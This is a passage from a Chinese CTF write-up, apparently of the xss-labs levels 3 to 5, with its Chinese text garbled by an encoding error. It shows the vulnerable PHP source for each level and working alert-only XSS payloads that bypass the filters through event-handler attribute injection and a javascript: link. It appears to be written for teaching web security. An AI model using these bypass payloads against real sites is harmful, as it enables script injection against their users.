src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.37.39.png" style="zoom:40%;"><h2 id="3-2-è§£é¢˜"><a href="#3-2-è§£é¢˜" class="headerlink" title="3.2 è§£é¢˜"></a>3.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å‚æ•°æäº¤ä¸å›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.38.45.png" style="zoom:40%;"><p>è·Ÿä¸Šä¸€å…³ç±»ä¼¼ï¼Œkeywordè·å–è¾“å…¥çš„å‚æ•°ï¼Œç„¶åé€šè¿‡GETæ–¹æ³•æäº¤ç»™åç«¯ï¼Œç„¶åå›æ˜¾åˆ°é¡µé¢ä¸­ã€‚</p><ul><li>åŸºç¡€POCå°è¯•</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.40.49.png" style="zoom:50%;"><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°æ‰€æœ‰å­˜åœ¨Pocçš„ä½ç½®ï¼Œ<code>&lt;</code>å’Œ<code>&gt;</code>éƒ½è¢«ç¼–ç äº†ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.41.31.png" style="zoom:50%;"><h2 id="3-3-ä»£ç å®¡è®¡"><a href="#3-3-ä»£ç å®¡è®¡" class="headerlink" title="3.3 ä»£ç å®¡è®¡"></a>3.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--STATUS OK--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html;charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"å®Œæˆçš„ä¸é”™ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level4.php?keyword=try harder!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value='"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level3.png</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:"</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h3&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€å…³ç›¸è¾ƒäºä¸Šä¸€å…³çš„åŒºåˆ«æ˜¯æ‰€æœ‰ä½¿ç”¨GETå‚æ•°çš„ä½ç½®éƒ½ç”¨htmlspecialcharså‡½æ•°è¿›è¡Œäº†ç¼–ç ã€‚</p><p>ä½†æ˜¯å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ</p><p>èƒ½å¦ä¸ä½¿ç”¨<code>&lt;&gt;</code>å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯å¯ä»¥çš„ã€‚æˆ‘ä»¬å¯ä»¥ä¸ºinputæ ‡ç­¾æ·»åŠ å±æ€§ï¼šå¦‚onmouseover</p><p>æ„é€ å¦‚ä¸‹çš„payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token string single-quoted-string">' onmouseover='</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">/</span>xss<span class="token operator">/</span><span class="token punctuation">)</span><span class="token string single-quoted-string">' '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.50.33.png" style="zoom:50%;"><p>å½“é¼ æ ‡æ”¾åœ¨inputæ¡†ä¸Šæ—¶ï¼Œè§¦å‘jsè„šæœ¬çš„æ‰§è¡Œã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.53.10.png" style="zoom:50%;"><h2 id="å°ç»“-2"><a href="#å°ç»“-2" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™ä¸€å…³æ˜¯ä¸Šä¸€å…³çš„è¿›é˜¶ï¼Œåœ¨å·¦å³å°–æ‹¬å·éƒ½è¢«ç¼–ç ä¹‹åï¼Œå¦‚æœå‚æ•°æ­£å¥½åœ¨<code>&lt;</code>æ ‡ç­¾ä¹‹åï¼Œé‚£ä¹ˆå¯ä»¥ä¸ºæ ‡ç­¾æ·»åŠ äº‹ä»¶å±æ€§è§¦å‘xssä»£ç çš„æ‰§è¡Œã€‚</p><h1 id="å››ã€level-04ï¼ˆåŸºäºäº‹ä»¶å±æ€§è§¦å‘xssä»£ç ï¼‰"><a href="#å››ã€level-04ï¼ˆåŸºäºäº‹ä»¶å±æ€§è§¦å‘xssä»£ç ï¼‰" class="headerlink" title="å››ã€level-04ï¼ˆåŸºäºäº‹ä»¶å±æ€§è§¦å‘xssä»£ç ï¼‰"></a>å››ã€level-04ï¼ˆåŸºäºäº‹ä»¶å±æ€§è§¦å‘xssä»£ç ï¼‰</h1><h2 id="4-1-é¢˜é¢"><a href="#4-1-é¢˜é¢" class="headerlink" title="4.1 é¢˜é¢"></a>4.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.57.49.png" style="zoom:40%;"><h2 id="4-2-è§£é¢˜"><a href="#4-2-è§£é¢˜" class="headerlink" title="4.2 è§£é¢˜"></a>4.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å‚æ•°æäº¤ä¸å›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.59.36.png" style="zoom:40%;"><p>è·Ÿä¹‹å‰ä¸€æ ·ï¼Œä»inputæ¡†è·å–keywordå‚æ•°ï¼Œç„¶ågetè¯·æ±‚æäº¤ï¼Œç„¶åå›æ˜¾åˆ°é¡µé¢ä¸­ã€‚</p><ul><li>å¼ºåŠ›POCæ¢æµ‹åç«¯è¿‡æ»¤å™¨</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script " ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.01.35.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.02.09.png" a="" style="zoom:50%;"><p>å‘ç°å·¦å³å°–æ‹¬å·è¢«æ›¿æ¢ä¸ºäº†ç©ºã€‚</p><ul><li>æ„é€ payload</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token string double-quoted-string">" onmouseover=alert(/xss/) "</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.05.12.png" style="zoom:50%;"><p>é€šè¿‡âœ…ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.09.01.png" alt="æŠ“åŒ…å“åº”" style="zoom:50%;"><h2 id="4-3-ä»£ç å®¡è®¡"><a href="#4-3-ä»£ç å®¡è®¡" class="headerlink" title="4.3 ä»£ç å®¡è®¡"></a>4.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--STATUS OK--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html;charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"å®Œæˆçš„ä¸é”™ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level5.php?keyword=find a way out!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str3</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level4.png</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:"</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h3&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€å…³åœ¨inputæ¡†çš„valueå¤„æ²¡æœ‰ä½¿ç”¨htmlspecialcharsç¼–ç ï¼Œè€Œæ˜¯ä½¿ç”¨è‡ªå®šä¹‰çš„è¿‡æ»¤å™¨å¤„ç†ã€‚ä¸‹é¢ä¸¤è¡Œä»£ç å°†å·¦å³å°–æ‹¬å·æ›¿æ¢ä¸ºäº†ç©ºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="å°ç»“-3"><a href="#å°ç»“-3" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™ä¸€å…³å’Œlevel-04çš„è§£æ³•åŸºæœ¬ä¸€è‡´ï¼Œéƒ½æ˜¯åœ¨inputæ ‡ç­¾ä¸­æ·»åŠ äº‹ä»¶å±æ€§ã€‚å…¶å®è¿™ä¸€å…³çš„è¿‡æ»¤å™¨ç›¸æ¯”htmlspecialcharsæ›´å¼±ï¼Œå› ä¸ºhtmlspecialcharsé»˜è®¤æ˜¯ä¼šå¯¹åŒå¼•å·è¿›è¡Œç¼–ç çš„</p><h1 id="äº”ã€level-05ï¼ˆaæ ‡ç­¾-ä¼ªåè®®è§¦å‘xssä»£ç æ‰§è¡Œï¼‰"><a href="#äº”ã€level-05ï¼ˆaæ ‡ç­¾-ä¼ªåè®®è§¦å‘xssä»£ç æ‰§è¡Œï¼‰" class="headerlink" title="äº”ã€level-05ï¼ˆaæ ‡ç­¾+ä¼ªåè®®è§¦å‘xssä»£ç æ‰§è¡Œï¼‰"></a>äº”ã€level-05ï¼ˆaæ ‡ç­¾+ä¼ªåè®®è§¦å‘xssä»£ç æ‰§è¡Œï¼‰</h1><h2 id="5-1-é¢˜é¢"><a href="#5-1-é¢˜é¢" class="headerlink" title="5.1 é¢˜é¢"></a>5.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.13.07.png" style="zoom:50%;"><h2 id="5-2-è§£é¢˜"><a href="#5-2-è§£é¢˜" class="headerlink" title="5.2 è§£é¢˜"></a>5.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å‚æ•°æäº¤å’Œå›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.14.16.png" style="zoom:50%;"><p>å’Œä¹‹å‰ä¸€æ ·ï¼Œä»ç„¶æ˜¯ä»inputè·å–è¾“å…¥çš„keywordï¼Œç„¶ågetè¯·æ±‚å‘é€åˆ°åç«¯ï¼Œç„¶åå›æ˜¾åˆ°é¡µé¢ã€‚</p><ul><li>å¼ºåŠ›POCæ¢æµ‹åç«¯è¿‡æ»¤å™¨</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script " ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.16.06.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.17.00.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°scriptä¸­é—´å’Œonä¸­é—´æ·»åŠ äº†ä¸‹åˆ’çº¿ï¼›å•åŒå¼•å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼›å¤§å†™è½¬åŒ–ä¸ºäº†å°å†™ã€‚</p><ul><li>æ€è·¯åˆ†æ</li></ul><p>å¯ä»¥ç»§ç»­æ²¿ç”¨ä¹‹å‰çš„æ€è·¯ï¼Œé€šè¿‡äº‹ä»¶å±æ€§æ¥è§¦å‘xssä»£ç æ‰§è¡Œï¼Œæ‰¾åˆ°ä¸€ä¸ªä¸åŒ…å«onçš„å±æ€§åå³å¯ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string single-quoted-string">'./smile.jpg'</span> onmouseover<span class="token operator">=</span><span class="token string single-quoted-string">'alert(/xss/)'</span><span class="token operator">&gt;</span> <span class="token comment">//é¼ æ ‡æ‚¬åœåœ¨å›¾ç‰‡ä¸Šçš„æ—¶å€™ï¼Œä¼šè§¦å‘XSSä»£ç </span><span class="token operator">&lt;</span>input type<span class="token operator">=</span> <span class="token string double-quoted-string">"text"</span> onkeydown<span class="token operator">=</span><span class="token string double-quoted-string">"alert(/xss/)"</span><span class="token operator">&gt;</span> <span class="token comment">//å½“ç‚¹å‡»é”®ç›˜ä»»æ„ä¸€ä¸ªæŒ‰é”®çš„æ—¶å€™è§¦å‘ã€‚</span><span class="token operator">&lt;</span>input type<span class="token operator">=</span> <span class="token string double-quoted-string">"text"</span> onkeyup<span class="token operator">=</span><span class="token string double-quoted-string">"alert(/xss/)"</span><span class="token operator">&gt;</span> <span class="token comment">//æ¾å¼€é”®ç›˜æŒ‰é’®è§¦å‘</span><span class="token operator">&lt;</span>input type<span class="token operator">=</span> <span class="token string double-quoted-string">"button"</span> onclick<span class="token operator">=</span><span class="token string double-quoted-string">"alert(/xss/)"</span> <span class="token comment">//ç‚¹å‡»æŒ‰é’®è§¦å‘</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string single-quoted-string">'./smile.jpg'</span> onerror<span class="token operator">=</span><span class="token string single-quoted-string">'alert(/xss/)'</span><span class="token operator">&gt;</span> <span class="token comment">//æ–‡æ¡£è½½å…¥å¤±è´¥è§¦å‘</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯ä¸Šè¿°äº‹ä»¶å±æ€§éƒ½åŒ…å«onã€‚</p><p>å¯ä»¥ä½¿ç”¨å…¶ä»–æ ‡ç­¾åŠ ä¼ªåè®®çš„æ–¹å¼ï¼š</p><ul><li>æ„é€ payload</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string double-quoted-string">"&gt; &lt;a href="</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">/</span>xss<span class="token operator">/</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string double-quoted-string">"&gt; ç‚¹æˆ‘&lt;/a&gt; &lt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.28.03.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.28.57.png" style="zoom:50%;"><p>æˆåŠŸæ’å…¥aæ ‡ç­¾ä¼ªåè®®ï¼Œè§¦å‘xssä»£ç æ‰§è¡Œã€‚</p><h2 id="5-3-ä»£ç å®¡è®¡"><a href="#5-3-ä»£ç å®¡è®¡" class="headerlink" title="5.3 ä»£ç å®¡è®¡"></a>5.3 ä»£ç å®¡è®¡</h2><p>ä»…å±•ç¤ºæ ¸å¿ƒä»£ç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str3</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>inputæ ‡ç­¾ä¸­ä½¿ç”¨è‡ªå®šçš„è¿‡æ»¤å™¨ï¼Œå…ˆå°†å†…å®¹è½¬åŒ–ä¸ºå°å†™ï¼Œç„¶åå°†<code>&lt;script</code>æ›¿æ¢æˆ<code>&lt;scr_ipt</code>ï¼Œå°†<code>on</code>æ›¿æ¢æˆ<code>o_n</code>ã€‚</p><p>å¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œå¹¶ä¸”ä¸ä½¿ç”¨å¸¦æœ‰<code>on</code>å­—ç¬¦ä¸²çš„äº‹ä»¶å±æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ªè¿‡æ»¤å™¨å°±èƒ½å¤Ÿè¢«ç»•è¿‡ã€‚</p><h2 id="å°ç»“-4"><a href="#å°ç»“-4" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬å…³è¿‡æ»¤äº†<code>&lt;script&gt;</code>æ ‡ç­¾å’Œ<code>on</code>å­—ç¬¦ä¸²ï¼Œä½¿ç”¨aæ ‡ç­¾+ä¼ªåè®®è§¦å‘xssä»£ç æ‰§è¡Œã€‚</p><h1 id="å…­ã€level-06ï¼ˆå¤§å†™ç»•è¿‡ï¼‰"><a href="#å…­ã€level-06ï¼ˆå¤§å†™ç»•è¿‡ï¼‰" class="headerlink" 